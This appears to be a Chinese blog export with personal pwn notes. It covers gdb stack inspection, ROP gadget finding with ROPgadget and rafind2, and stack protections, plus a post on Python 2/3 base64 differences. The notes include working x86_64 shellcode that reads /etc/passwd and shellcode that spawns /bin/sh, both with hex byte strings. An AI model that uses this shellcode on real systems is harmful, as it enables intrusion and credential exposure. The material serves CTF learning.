0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0024| 0x7fffffffdd10 --&gt; 0x100008000 \n0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffdd20 --&gt; 0x0 \n0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n0064| 0x7fffffffdd38 --&gt; 0x7fffffffddd0 --&gt; 0x1 \n0072| 0x7fffffffdd40 --&gt; 0x0 \n0080| 0x7fffffffdd48 --&gt; 0x0 \n0088| 0x7fffffffdd50 --&gt; 0x3e3e2b88b8ee246d \n0096| 0x7fffffffdd58 --&gt; 0x3e3e3b37b470246d \n0104| 0x7fffffffdd60 --&gt; 0x7fff00000000 \n0112| 0x7fffffffdd68 --&gt; 0x0 \n0120| 0x7fffffffdd70 --&gt; 0x0 \n0128| 0x7fffffffdd78 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:    add    r14,0x8)\n0136| 0x7fffffffdd80 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 \n0144| 0x7fffffffdd88 --&gt; 0x22bf66c6 \n0152| 0x7fffffffdd90 --&gt; 0x0 \n0160| 0x7fffffffdd98 --&gt; 0x0 \n0168| 0x7fffffffdda0 --&gt; 0x0 \n0176| 0x7fffffffdda8 --&gt; 0x555555554610 (&lt;_start&gt;:    xor    ebp,ebp)\n0184| 0x7fffffffddb0 --&gt; 0x7fffffffddd0 --&gt; 0x1 \n0192| 0x7fffffffddb8 --&gt; 0x55555555463a (&lt;_start+42&gt;:    hlt)\n--More--(25/200)\n0200| 0x7fffffffddc0 --&gt; 0x7fffffffddc8 --&gt; 0x1c \n0208| 0x7fffffffddc8 --&gt; 0x1c \n0216| 0x7fffffffddd0 --&gt; 0x1 \n0224| 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)\n0232| 0x7fffffffdde0 --&gt; 0x0 \n0240| 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)\n0248| 0x7fffffffddf0 --&gt; 0x7fffffffe1d1 (&quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc&quot;...)\n0256| 0x7fffffffddf8 --&gt; 0x7fffffffe7bd (&quot;LC_MEASUREMENT=zh_CN.UTF-8&quot;)\n0264| 0x7fffffffde00 --&gt; 0x7fffffffe7d8 (&quot;LESSCLOSE=/usr/bin/lesspipe %s %s&quot;)\n0272| 0x7fffffffde08 --&gt; 0x7fffffffe7fa (&quot;LC_PAPER=zh_CN.UTF-8&quot;)\n0280| 0x7fffffffde10 --&gt; 0x7fffffffe80f (&quot;LC_MONETARY=zh_CN.UTF-8&quot;)\n0288| 0x7fffffffde18 --&gt; 0x7fffffffe827 (&quot;XDG_MENU_PREFIX=gnome-&quot;)\n0296| 0x7fffffffde20 --&gt; 0x7fffffffe83e (&quot;_=/usr/bin/gdb&quot;)\n0304| 0x7fffffffde28 --&gt; 0x7fffffffe84d (&quot;LANG=en_US.UTF-8&quot;)\n0312| 0x7fffffffde30 --&gt; 0x7fffffffe85e (&quot;DISPLAY=:0&quot;)\n0320| 0x7fffffffde38 --&gt; 0x7fffffffe869 (&quot;ABC=/bin/sh&quot;)\n0328| 0x7fffffffde40 --&gt; 0x7fffffffe875 (&quot;OLDPWD=/home/tianji/Desktop/sploit&quot;)\n0336| 0x7fffffffde48 --&gt; 0x7fffffffe898 (&quot;GNOME_SHELL_SESSION_MODE=ubuntu&quot;)\n0344| 0x7fffffffde50 --&gt; 0x7fffffffe8b8 (&quot;COLORTERM=truecolor&quot;)\n0352| 0x7fffffffde58 --&gt; 0x7fffffffe8cc (&quot;USERNAME=tianji&quot;)\n0360| 0x7fffffffde60 --&gt; 0x7fffffffe8dc (&quot;XDG_VTNR=1&quot;)\n0368| 0x7fffffffde68 --&gt; 0x7fffffffe8e7 (&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;)\n0376| 0x7fffffffde70 --&gt; 0x7fffffffe910 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)\n0384| 0x7fffffffde78 --&gt; 0x7fffffffe946 (&quot;LC_NAME=zh_CN.UTF-8&quot;)\n0392| 0x7fffffffde80 --&gt; 0x7fffffffe95a (&quot;XDG_SESSION_ID=1&quot;)\n</code></pre><p>可以看到”/bin/sh”的地址：<code>0x7fffffffe869 + 0x6 = 0x7fffffffe86e</code>。</p>\n<pre><code>gdb-peda$ x/s 0x7fffffffe86e\n0x7fffffffe86e:    &quot;bin/sh&quot;\n</code></pre><p>当然，这个方法仅限本地使用。</p>\n<h2 id=\"反汇编代码\"><a href=\"#反汇编代码\" class=\"headerlink\" title=\"反汇编代码\"></a>反汇编代码</h2><pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;jmp rsp&quot;\nffe4\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;pop rdi; ret&quot;\n5fc3\ntianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm &quot;5fc3&quot;\n   0:    5f                       pop    edi\n   1:    c3                       ret\n</code></pre><h2 id=\"在可执行文件中找gadget\"><a href=\"#在可执行文件中找gadget\" class=\"headerlink\" title=\"在可执行文件中找gadget\"></a>在可执行文件中找gadget</h2><p>方法一:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln\n0x7f3\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............\n0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........\n0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..\n0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................\n0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\\....\n</code></pre><p>可以看到5fc3的偏移位置就是: ‘0x7f3’</p>\n<p>方法二:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all\nGadgets information\n============================================================\n0x0000000000000707 : add bl, dh ; ret\n0x00000000000007ff : add bl, dh ; ret\n0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret\n0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret\n0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret\n0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret\n0x0000000000000788 : add byte ptr [rax], al ; leave ; ret\n0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000706 : add byte ptr [rax], al ; ret\n0x00000000000007fe : add byte ptr [rax], al ; ret\n0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret\n0x0000000000000789 : add cl, cl ; ret\n0x00000000000005a3 : add esp, 8 ; ret\n0x0000000000000809 : add esp, 8 ; ret\n0x00000000000005a2 : add rsp, 8 ; ret\n0x0000000000000808 : add rsp, 8 ; ret\n0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax\n0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax\n0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax\n0x00000000000007d9 : call qword ptr [r12 + rbx*8]\n0x00000000000007da : call qword ptr [rsp + rbx*8]\n0x00000000000005a0 : call rax\n0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret\n0x000000000000059e : je 0x5a4 ; call rax\n0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax\n0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax\n0x0000000000000664 : jmp rax\n0x00000000000006b5 : jmp rax\n0x000000000000078a : leave ; ret\n0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret\n0x0000000000000785 : mov eax, 0 ; leave ; ret\n0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]\n0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]\n0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000007f8 : nop dword ptr [rax + rax] ; ret\n0x0000000000000701 : nop dword ptr [rax] ; ret\n0x00000000000006b3 : or al, 0x5d ; jmp rax\n0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret\n0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]\n0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007f0 : pop r14 ; pop r15 ; ret\n0x00000000000007f2 : pop r15 ; ret\n0x0000000000000663 : pop rbp ; jmp rax\n0x00000000000006b4 : pop rbp ; jmp rax\n0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000000670 : pop rbp ; ret\n0x00000000000006c0 : pop rbp ; ret\n0x00000000000006ff : pop rbp ; ret\n0x00000000000007f3 : pop rdi ; ret\n0x00000000000007f1 : pop rsi ; pop r15 ; ret\n0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000005a6 : ret\n0x0000000000000671 : ret\n0x00000000000006c1 : ret\n0x0000000000000700 : ret\n0x0000000000000709 : ret\n0x0000000000000708 : ret\n0x000000000000078b : ret\n0x00000000000007df : ret\n0x00000000000007f4 : ret\n0x0000000000000801 : ret\n0x0000000000000800 : ret\n0x000000000000080c : ret\n0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret\n0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret\n0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret\n0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax\n0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax\n0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax\n0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax\n0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax\n0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax\n\nUnique gadgets found: 85\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep &quot;pop rdi ; ret&quot;\n0x00000000000007f3 : pop rdi ; ret\n</code></pre><h2 id=\"shellcode编写\"><a href=\"#shellcode编写\" class=\"headerlink\" title=\"shellcode编写\"></a>shellcode编写</h2><p>读取/etc/passwd</p>\n<pre><code>BITS 64 \n; Author Mr.Un1k0d3r - RingZer0 Team \n; Read /etc/passwd Linux x86_64 Shellcode \n; Shellcode size 82 bytes \nglobal _start \nsection .text \n_start: \n    jmp _push_filename \n\n_readfile: \n    ; syscall open file \n    pop rdi   ; pop path value \n    ; NULL byte fix \n    xor byte [rdi + 11], 0x41 \n\n    xor rax, rax \n    add al, 2 \n    xor rsi, rsi  ; set O_RDONLY flag \n    syscall \n\n    ; syscall read file \n    sub sp, 0xfff \n    lea rsi, [rsp] \n    mov rdi, rax \n    xor rdx, rdx \n    mov dx, 0xfff   ; size to read \n    xor rax, rax \n    syscall \n\n    ; syscall write to stdout \n    xor rdi, rdi \n    add dil, 1 ; set stdout fd = 1 \n    mov rdx, rax \n    xor rax, rax \n    add al, 1 \n    syscall \n\n    ; syscall exit \n    xor rax, rax \n    add al, 60 \n    syscall \n\n_push_filename: \n    call _readfile \n    path: db &quot;/etc/passwdA&quot;\n</code></pre><pre><code>$ nasm -f elf64 readfile.asm -o readfile.o \n$ for i in $(objdump  -d readfile.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#39;\\x&#39;$i; done; echo \n\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x6 \n6\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x \n0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\ \nxc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f \n\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41\n</code></pre><p>execve /bin/sh</p>\n<pre><code>.global _start\n_start:\n    xor %esi, %esi\n    # /bin//sh\n    movabs $0x68732f2f6e69622f, %rbx\n    push %rsi\n    push %rbx\n    push %rsp\n    pop %rdi\n    pushq $59\n    pop %rax\n    xor %edx, %edx\n    syscall\n</code></pre><pre><code class=\"\\\">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh\n$ asd\nsh: 1: asd: not found\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep &quot;^ &quot; | cut -f2); do echo -n &#39;\\x&#39;$i; done; echo\n\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\n</code></pre>\n<h2 id=\"retn和leave和call\"><a href=\"#retn和leave和call\" class=\"headerlink\" title=\"retn和leave和call\"></a>retn和leave和call</h2><p>retn: </p>\n<blockquote>\n<p>64位: pop rip;  rsp = rsp + 8</p>\n<p>32位: pop eip; esp = esp + 4</p>\n<p>retn N操作：先eip=[esp]，然后esp=esp+4+N</p>\n</blockquote>\n<p>leave:</p>\n<blockquote>\n<p>64位: move rsp rbp; pop rbp               将rbp中的值传给rsp</p>\n<p>32位: move esp ebp; pop ebp             将ebp中的值传给esp</p>\n</blockquote>\n<p>call:</p>\n<blockquote>\n<p>64位: push rip; jump 目的位置</p>\n<p>32位: push eip; jump 目的位置</p>\n</blockquote>\n<h2 id=\"32位寻找偏移\"><a href=\"#32位寻找偏移\" class=\"headerlink\" title=\"32位寻找偏移\"></a>32位寻找偏移</h2><blockquote>\n<p>pattern_create 50</p>\n<p>pattern_offset 字符串</p>\n</blockquote>\n<h2 id=\"有符号整数比较和无符号整数比较\"><a href=\"#有符号整数比较和无符号整数比较\" class=\"headerlink\" title=\"有符号整数比较和无符号整数比较\"></a>有符号整数比较和无符号整数比较</h2><table>\n<thead>\n<tr>\n<th>指令</th>\n<th>含义</th>\n<th>运算符号</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>jbe</td>\n<td>unsigned below or equal (lower or same)</td>\n<td>&lt;=</td>\n</tr>\n<tr>\n<td>jae</td>\n<td>unsigned above or equal (higher or same)</td>\n<td>&gt;=</td>\n</tr>\n<tr>\n<td>jb</td>\n<td>unsigned below (lower)</td>\n<td>&lt;</td>\n</tr>\n<tr>\n<td>ja</td>\n<td>unsigned above (higher)</td>\n<td>&gt;</td>\n</tr>\n<tr>\n<td>jle</td>\n<td>signed less or equal</td>\n<td>&lt;=</td>\n</tr>\n<tr>\n<td>jge</td>\n<td>signed greater or equal</td>\n<td>&gt;=</td>\n</tr>\n<tr>\n<td>jl</td>\n<td>signed less than</td>\n<td>&lt;</td>\n</tr>\n<tr>\n<td>jg</td>\n<td>signed greater than</td>\n<td>&gt;</td>\n</tr>\n</tbody>\n</table>\n<p>从上面的表中可以看出，</p>\n<p>对于无符号（unsigned）整数比较，使用的是单词是above或below；<br>对于有符号(signed)整数比较，则使用的单词是greater或less。</p>\n<h2 id=\"查找argv-0-变量的地址\"><a href=\"#查找argv-0-变量的地址\" class=\"headerlink\" title=\"查找argv[0]变量的地址\"></a>查找argv[0]变量的地址</h2><pre><code>gdb-peda$ find /home\nSearching for &#39;/home&#39; in: None ranges\nFound 6 results, display max 6 items:\n[stack] : 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)\n[stack] : 0x7fffffffe8f4 (&quot;/home/tianji/Desktop/pwn/jarvis&quot;)\n[stack] : 0x7fffffffeb12 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes&quot;)\n[stack] : 0x7fffffffeb48 (&quot;/home/tianji&quot;)\n[stack] : 0x7fffffffeee7 (&quot;/home/tianji/.vimpkg/bin&quot;)\n[stack] : 0x7fffffffefc8 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)\ngdb-peda$ find 0x7fffffffdff6\nSearching for &#39;0x7fffffffdff6&#39; in: None ranges\nFound 2 results, display max 2 items:\n   libc : 0x7ffff7dd0508 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)\n[stack] : 0x7fffffffdc68 --&gt; 0x7fffffffdff6 (&quot;/home/tianji/Desktop/pwn/jarvis/smashes/smashes&quot;)\ngdb-peda$ distance $rsp 0x7fffffffdc68\nFrom 0x7fffffffda50 to 0x7fffffffdc68: 536 bytes, 134 dwords\n</code></pre><p>首先搜索字符串”/home”,第一个地址是真实地址，在搜索指向该地址的指针，该指针也就是我们要找的argv[0]的地址。</p>\n<p>当前$rsp的值就是 存在栈溢出变量的地址</p>\n"},{"title":"python3和python2 base64的问题","date":"2018-03-26T09:12:56.000Z","_content":"首先我们来看两段代码：\n\npython2.7:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint base64.b64encode(text1)\n</pre>\n<pre>\n结果:\nfYN9fm93\n</pre>\n\npython3.5:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += (chr(ord(i) +10))\nprint(base64.b64encode(str.encode(text1)))\n</pre>\n<pre>\n结果:\nb'fcKDfX5vdw=='\n</pre>\n\n我们可以发现，两次base64的结果并不相同。\n\n原因:\n\n我们可以将text1打印出来:\n\npython2.7:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint text1\n</pre>\n\n<pre>\n结果:\n}儅~ow\n</pre>\n\npython3.5:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint(str.encode(text1))\n</pre>\n\n<pre>\n结果:\nb'}\\xc2\\x83}~ow'\n</pre>\n\n在经过\n```\nchr(ord(i) +10)\n```\n操作之后，text1的ascii码变为:\n\n```\n125,131,125,126,111,109\n```\n对应16进制\n\n```\n\\x7d,\\x83,\\x7d,\\x7e,\\x6f,\\x6d\n```\n我们可以发现，在python3.5的情况下，\\x83变成了 \\xc2\\x83，这是因为str.encode默认采用utf-8编码来解码text1。\n\n解决方法:\n在python3.5下，我们可以使用bytesarray\n<pre>\ntext = 'system'\ntext1 =  bytearray()\nfor i in text:\n    text1.append(ord(i) + 10)\nprint(text1)\nprint(base64.b64encode(text1))\n</pre>\n<pre>\n结果:\nbytearray(b'}\\x83}~ow')\nb'fYN9fm93'\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/python3和python2-base64的问题.md","raw":"---\ntitle: python3和python2 base64的问题\ndate: 2018-03-26 17:12:56\ntags:\n- python\n---\n首先我们来看两段代码：\n\npython2.7:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint base64.b64encode(text1)\n</pre>\n<pre>\n结果:\nfYN9fm93\n</pre>\n\npython3.5:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += (chr(ord(i) +10))\nprint(base64.b64encode(str.encode(text1)))\n</pre>\n<pre>\n结果:\nb'fcKDfX5vdw=='\n</pre>\n\n我们可以发现，两次base64的结果并不相同。\n\n原因:\n\n我们可以将text1打印出来:\n\npython2.7:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint text1\n</pre>\n\n<pre>\n结果:\n}儅~ow\n</pre>\n\npython3.5:\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint(str.encode(text1))\n</pre>\n\n<pre>\n结果:\nb'}\\xc2\\x83}~ow'\n</pre>\n\n在经过\n```\nchr(ord(i) +10)\n```\n操作之后，text1的ascii码变为:\n\n```\n125,131,125,126,111,109\n```\n对应16进制\n\n```\n\\x7d,\\x83,\\x7d,\\x7e,\\x6f,\\x6d\n```\n我们可以发现，在python3.5的情况下，\\x83变成了 \\xc2\\x83，这是因为str.encode默认采用utf-8编码来解码text1。\n\n解决方法:\n在python3.5下，我们可以使用bytesarray\n<pre>\ntext = 'system'\ntext1 =  bytearray()\nfor i in text:\n    text1.append(ord(i) + 10)\nprint(text1)\nprint(base64.b64encode(text1))\n</pre>\n<pre>\n结果:\nbytearray(b'}\\x83}~ow')\nb'fYN9fm93'\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"python3和python2-base64的问题","published":1,"updated":"2018-03-28T08:55:14.804Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpm000oly4jlkp4k7in","content":"<p>首先我们来看两段代码：</p>\n<p>python2.7:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint base64.b64encode(text1)\n</pre>\n<pre>\n结果:\nfYN9fm93\n</pre>\n\n<p>python3.5:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += (chr(ord(i) +10))\nprint(base64.b64encode(str.encode(text1)))\n</pre>\n<pre>\n结果:\nb'fcKDfX5vdw=='\n</pre>\n\n<p>我们可以发现，两次base64的结果并不相同。</p>\n<p>原因:</p>\n<p>我们可以将text1打印出来:</p>\n<p>python2.7:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint text1\n</pre>\n\n<pre>\n结果:\n}儅~ow\n</pre>\n\n<p>python3.5:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint(str.encode(text1))\n</pre>\n\n<pre>\n结果:\nb'}\\xc2\\x83}~ow'\n</pre>\n\n<p>在经过</p>\n<pre><code>chr(ord(i) +10)\n</code></pre><p>操作之后，text1的ascii码变为:</p>\n<pre><code>125,131,125,126,111,109\n</code></pre><p>对应16进制</p>\n<pre><code>\\x7d,\\x83,\\x7d,\\x7e,\\x6f,\\x6d\n</code></pre><p>我们可以发现，在python3.5的情况下，\\x83变成了 \\xc2\\x83，这是因为str.encode默认采用utf-8编码来解码text1。</p>\n<p>解决方法:<br>在python3.5下，我们可以使用bytesarray</p>\n<pre>\ntext = 'system'\ntext1 =  bytearray()\nfor i in text:\n    text1.append(ord(i) + 10)\nprint(text1)\nprint(base64.b64encode(text1))\n</pre>\n<pre>\n结果:\nbytearray(b'}\\x83}~ow')\nb'fYN9fm93'\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<p>首先我们来看两段代码：</p>\n<p>python2.7:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint base64.b64encode(text1)\n</pre>\n<pre>\n结果:\nfYN9fm93\n</pre>\n\n<p>python3.5:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += (chr(ord(i) +10))\nprint(base64.b64encode(str.encode(text1)))\n</pre>\n<pre>\n结果:\nb'fcKDfX5vdw=='\n</pre>\n\n<p>我们可以发现，两次base64的结果并不相同。</p>\n<p>原因:</p>\n<p>我们可以将text1打印出来:</p>\n<p>python2.7:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint text1\n</pre>\n\n<pre>\n结果:\n}儅~ow\n</pre>\n\n<p>python3.5:</p>\n<pre>\ntext = 'system'\ntext1 = ''\nfor i in text:\n    text1 += chr(ord(i) +10)\nprint(str.encode(text1))\n</pre>\n\n<pre>\n结果:\nb'}\\xc2\\x83}~ow'\n</pre>\n\n<p>在经过</p>\n<pre><code>chr(ord(i) +10)\n</code></pre><p>操作之后，text1的ascii码变为:</p>\n<pre><code>125,131,125,126,111,109\n</code></pre><p>对应16进制</p>\n<pre><code>\\x7d,\\x83,\\x7d,\\x7e,\\x6f,\\x6d\n</code></pre><p>我们可以发现，在python3.5的情况下，\\x83变成了 \\xc2\\x83，这是因为str.encode默认采用utf-8编码来解码text1。</p>\n<p>解决方法:<br>在python3.5下，我们可以使用bytesarray</p>\n<pre>\ntext = 'system'\ntext1 =  bytearray()\nfor i in text:\n    text1.append(ord(i) + 10)\nprint(text1)\nprint(base64.b64encode(text1))\n</pre>\n<pre>\n结果:\nbytearray(b'}\\x83}~ow')\nb'fYN9fm93'\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"pwn备忘录","date":"2018-05-09T12:55:11.000Z","_content":"\n## checksec检测到的保护机制\n\n1. cannary  (栈保护)\n\n   栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 \n\n   gcc选项: \n\n   * gcc4.2版本-fstack-protector和-fstack-protector-all编译参数开启栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。 \n   * -fno-stack-protector 不开启栈保护 \n\n   > gcc -fno-stack-protector -o test test.c  //禁用栈保护 \n   >\n   > gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 \n   >\n   > gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 \n\n2. fortify\n\n   它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。\n\n3. NX(windows下叫 DEP)\n\n   NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 \n\n   gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 \n\n4. PIE(windows下ASLR)（address space layout randomization）\n\n   一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。 \n\n   > 0 - 表示关闭进程地址空间随机化。 \n   >\n   > 1 - 表示将mmap的基址，stack和vdso页面随机化。 \n   >\n   > 2 - 表示在1的基础上增加栈（heap）的随机化。 \n\n   可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。\n\n   Built as PIE：位置独立的可执行区域（position-independent 